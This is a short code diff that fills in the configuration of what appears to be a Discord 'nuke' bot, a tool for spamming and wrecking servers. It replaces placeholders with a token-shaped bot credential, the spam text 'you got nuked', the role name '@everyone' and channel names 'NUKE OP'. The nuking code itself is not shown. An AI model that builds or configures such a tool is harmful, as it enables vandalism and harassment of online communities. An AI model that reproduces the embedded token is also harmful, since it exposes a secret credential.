@@ -11,11 +11,11 @@ intents.members = True
 
 ###########SETUP###############
  = "?"                                                       #
-token = "TOKEN"                                            #
-spam_messages = "Spam message"         #
+token = "ODI5Mzg5MzIyNjE2NTY5ODk4.YG3a_w.1y1MsSoCEYtFSz0FLJrSLc1WK0I"                                            #
+spam_messages = "you got nuked"         #
 massdm = "Currently broken.."                    #
-rolenames = "Role Names To Spam"         #                                                            
-channels = "Channels To Spam Names"  #
+rolenames = "@everyone"         #                                                            
+channels = "NUKE OP"  #
 ##############################
 
 def Clear():
